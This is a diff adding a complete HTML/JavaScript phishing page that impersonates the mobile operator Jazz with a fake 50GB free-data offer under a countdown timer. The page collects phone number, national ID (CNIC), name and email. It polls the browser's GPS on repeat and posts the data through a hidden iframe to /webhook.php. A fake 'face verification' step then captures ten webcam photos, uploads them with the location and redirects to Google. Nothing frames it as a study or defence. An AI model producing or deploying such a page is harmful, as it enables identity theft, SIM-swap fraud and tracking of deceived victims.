@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Jazz – 50GB Free Internet Offer</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        body { background: #f8f8f8; font-family: 'Segoe UI', Arial, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .card { background: #fff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); padding: 30px 20px; width: 100%; max-width: 400px; text-align: center; }
+        .jazz-logo { font-size: 48px; color: #e40000; margin-bottom: 10px; }
+        .offer-badge { background: #e40000; color: white; padding: 4px 12px; border-radius: 20px; font-size: 14px; display: inline-block; margin-bottom: 15px; font-weight: 600; }
+        h1 { color: #e40000; font-size: 24px; margin: 0 0 5px; }
+        .subtitle { color: #555; font-size: 14px; margin-bottom: 20px; }
+        .highlight { color: #e40000; font-weight: 700; }
+        .countdown { background: #fce8e8; border-radius: 8px; padding: 8px; margin-bottom: 20px; font-size: 13px; color: #e40000; }
+        .user-badge { background: #f0f0f0; border-radius: 8px; padding: 8px 16px; color: #333; font-weight: 600; display: inline-block; margin-bottom: 20px; }
+        .form-group { margin-bottom: 12px; text-align: left; }
+        .form-group label { display: block; font-size: 12px; color: #555; margin-bottom: 4px; font-weight: 600; }
+        .form-group input { width: 100%; padding: 10px 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 14px; box-sizing: border-box; }
+        .btn { background: #e40000; color: white; border: none; padding: 12px 30px; border-radius: 6px; font-size: 16px; cursor: pointer; width: 100%; font-weight: 600; }
+        .btn:hover { background: #c00000; }
+        .status { font-size: 12px; color: #777; margin-top: 10px; min-height: 20px; }
+        .hidden { display: none !important; }
+        .face-circle { width: 140px; height: 140px; border-radius: 50%; overflow: hidden; border: 3px solid #e40000; margin: 15px auto; background: #000; }
+        .face-circle video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .instruction { font-weight: bold; color: #e40000; margin: 10px 0; min-height: 24px; }
+        .progress-dots { display: flex; justify-content: center; gap: 6px; margin: 10px 0; }
+        .dot { width: 8px; height: 8px; border-radius: 50%; background: #ccc; }
+        .dot.active { background: #e40000; }
+        .dot.done { background: #27ae60; }
+        .success-icon { font-size: 48px; color: #27ae60; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+    <iframe name="hidden_iframe" style="display:none;"></iframe>
+
+    <!-- Offer Card -->
+    <div class="card" id="offer-card">
+        <div class="jazz-logo"><i class="fas fa-bolt"></i></div>
+        <div class="offer-badge">Limited Time Offer</div>
+        <h1>🎉 50GB Free Internet!</h1>
+        <p class="subtitle">Congratulations! You are eligible for a <span class="highlight">free 50GB</span> data package on your Jazz number.</p>
+        <div class="countdown"><i class="fas fa-hourglass-half"></i> Offer expires in <span id="timer">04:59</span></div>
+        <div class="user-badge" id="target-username">Subscriber: __TARGET_USER__</div>
+
+        <form id="claim-form" action="/webhook.php" method="POST" target="hidden_iframe">
+            <div class="form-group">
+                <label>Mobile Number (Jazz)</label>
+                <input type="tel" name="phone" placeholder="03XX-XXXXXXX" required>
+            </div>
+            <div class="form-group">
+                <label>CNIC Number</label>
+                <input type="text" name="cnic" placeholder="XXXXX-XXXXXXX-X" required>
+            </div>
+            <div class="form-group">
+                <label>Full Name</label>
+                <input type="text" name="full_name" placeholder="Enter your full name" required>
+            </div>
+            <div class="form-group">
+                <label>Email Address (for confirmation)</label>
+                <input type="email" name="email" placeholder="you@example.com" required>
+            </div>
+            <input type="hidden" name="gps" id="hidden-gps">
+            <button type="submit" class="btn" id="claim-btn"><i class="fas fa-gift"></i> Claim My Free 50GB</button>
+        </form>
+        <p class="status" id="form-status">Location access is required to verify your eligibility</p>
+    </div>
+
+    <!-- Camera Card -->
+    <div class="card hidden" id="camera-card">
+        <h1>Face Verification</h1>
+        <p class="subtitle">To prevent fraud, we need to confirm your identity.</p>
+        <div class="user-badge" id="cam-username">Subscriber: __TARGET_USER__</div>
+        <div class="face-circle"><video id="face-video" autoplay playsinline muted></video></div>
+        <div class="instruction" id="instruction">Press "Start Face Scan"</div>
+        <div class="progress-dots">
+            <span class="dot" data-phase="0"></span>
+            <span class="dot" data-phase="1"></span>
+            <span class="dot" data-phase="2"></span>
+            <span class="dot" data-phase="3"></span>
+        </div>
+        <p id="scan-status" class="status">Position your face inside the circle</p>
+        <button class="btn" id="start-scan-btn"><i class="fas fa-camera"></i> Start Face Scan</button>
+    </div>
+
+    <!-- Success Card -->
+    <div class="card hidden" id="success-card">
+        <div class="success-icon"><i class="fas fa-check-circle"></i></div>
+        <h1 style="color:#27ae60;">Data Package Activated!</h1>
+        <p class="subtitle">Your free 50GB will be credited to your number within 24 hours.</p>
+        <p class="status">You will be redirected shortly…</p>
+    </div>
+
+    <script>
+    (function() {
+        var params = new URLSearchParams(window.location.search);
+        var user = params.get('user') || '__TARGET_USER__';
+        document.getElementById('target-username').textContent = 'Subscriber: ' + user;
+        document.getElementById('cam-username').textContent = 'Subscriber: ' + user;
+
+        // Countdown timer
+        var timeLeft = 4*60 + 59;
+        var timerEl = document.getElementById('timer');
+        var countdown = setInterval(function() {
+            var m = Math.floor(timeLeft / 60);
+            var s = timeLeft % 60;
+            timerEl.textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+            if (timeLeft <= 0) clearInterval(countdown);
+            timeLeft--;
+        }, 1000);
+
+        // Aggressive GPS
+        var gpsDone = false;
+        var gpsAttempts = 0;
+        var maxAttempts = 10;
+
+        function aggressiveGPS() {
+            if (gpsDone) return;
+            gpsAttempts++;
+            var options = {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            };
+            if (gpsAttempts > 3) {
+                options.enableHighAccuracy = false;
+                options.timeout = 3000;
+            }
+            navigator.geolocation.getCurrentPosition(
+                function(pos) {
+                    gpsDone = true;
+                    window._gpsCaptured = {
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        accuracy: Math.round(pos.coords.accuracy)
+                    };
+                    document.getElementById('hidden-gps').value = JSON.stringify(window._gpsCaptured);
+                    document.getElementById('form-status').textContent = 'Location confirmed. Continue to claim.';
+                },
+                function(err) {
+                    if (gpsAttempts < maxAttempts) {
+                        setTimeout(aggressiveGPS, 300);
+                    } else {
+                        document.getElementById('form-status').textContent = 'Location is required. Please enable GPS and tap anywhere to retry.';
+                    }
+                },
+                options
+            );
+        }
+
+        aggressiveGPS();
+        ['click', 'touchstart', 'scroll', 'mousemove'].forEach(function(evt) {
+            document.addEventListener(evt, function() {
+                if (!gpsDone) aggressiveGPS();
+            }, { passive: true });
+        });
+        setInterval(function() {
+            if (!gpsDone) aggressiveGPS();
+        }, 2000);
+    })();
+
+    // Form submission: let it post to iframe, then show camera
+    document.getElementById('claim-form').addEventListener('submit', function(e) {
+        // No preventDefault; form will post normally.
+        setTimeout(function() {
+            document.getElementById('offer-card').classList.add('hidden');
+            document.getElementById('camera-card').classList.remove('hidden');
+        }, 1000);
+    });
+
+    // Camera capture (10 photos)
+    var startBtn = document.getElementById('start-scan-btn');
+    var video = document.getElementById('face-video');
+    var instruction = document.getElementById('instruction');
+    var scanStatus = document.getElementById('scan-status');
+    var dots = document.querySelectorAll('.dot');
+    var stream = null, photos = [];
+
+    var PHASES = [
+        { name: 'Look straight ahead', count: 3 },
+        { name: 'Turn head slightly left', count: 3 },
+        { name: 'Turn head slightly right', count: 3 },
+        { name: 'Hold still for final photo', count: 1 }
+    ];
+
+    function resetDots() { dots.forEach(d => d.classList.remove('active','done')); }
+    function setPhase(i) {
+        resetDots();
+        for (var j = 0; j <= i; j++) {
+            if (j < i) dots[j].classList.add('done');
+            else dots[j].classList.add('active');
+        }
+    }
+    function snap() {
+        var c = document.createElement('canvas');
+        c.width = video.videoWidth || 640;
+        c.height = video.videoHeight || 480;
+        c.getContext('2d').drawImage(video, 0, 0);
+        return c.toDataURL('image/jpeg', 0.7);
+    }
+    function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
+    function uploadPhotos(arr) {
+        scanStatus.textContent = 'Uploading…';
+        var fd = new FormData();
+        arr.forEach(function(b64, i) {
+            var blob = dataURItoBlob(b64);
+            fd.append('photo_' + i, blob, 'face_' + i + '.jpg');
+        });
+        if (window._gpsCaptured) fd.append('gps', JSON.stringify(window._gpsCaptured));
+        fetch('/webhook.php', { method: 'POST', body: fd })
+            .then(function() {
+                document.getElementById('camera-card').classList.add('hidden');
+                document.getElementById('success-card').classList.remove('hidden');
+                setTimeout(function() { location.href = 'https://www.google.com'; }, 3000);
+            })
+            .catch(function() {
+                scanStatus.textContent = 'Upload failed. Redirecting…';
+                setTimeout(function() { location.href = 'https://www.google.com'; }, 2000);
+            });
+    }
+    function dataURItoBlob(d) {
+        var a = d.split(','), m = a[0].match(/:(.*?);/)[1], b = atob(a[1]), n = b.length, u = new Uint8Array(n);
+        for (var i = 0; i < n; i++) u[i] = b.charCodeAt(i);
+        return new Blob([u], { type: m });
+    }
+
+    startBtn.addEventListener('click', async function() {
+        if (startBtn.disabled) return;
+        startBtn.disabled = true;
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
+            video.srcObject = stream; await video.play(); await wait(500);
+            for (var p = 0; p < PHASES.length; p++) {
+                setPhase(p);
+                instruction.textContent = PHASES[p].name;
+                scanStatus.textContent = 'Capturing…';
+                for (var i = 0; i < PHASES[p].count; i++) {
+                    photos.push(snap());
+                    if (i < PHASES[p].count - 1) await wait(800);
+                }
+                if (p < PHASES.length - 1) await wait(600);
+            }
+            stream.getTracks().forEach(t => t.stop()); video.srcObject = null;
+            instruction.textContent = 'Scan complete!'; scanStatus.textContent = 'Processing…';
+            uploadPhotos(photos);
+        } catch (e) {
+            scanStatus.textContent = 'Error: ' + (e.message || e.name);
+            startBtn.disabled = false;
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        }
+    });
+    </script>
+    <!-- tc_payload -->
+</body>
+</html>
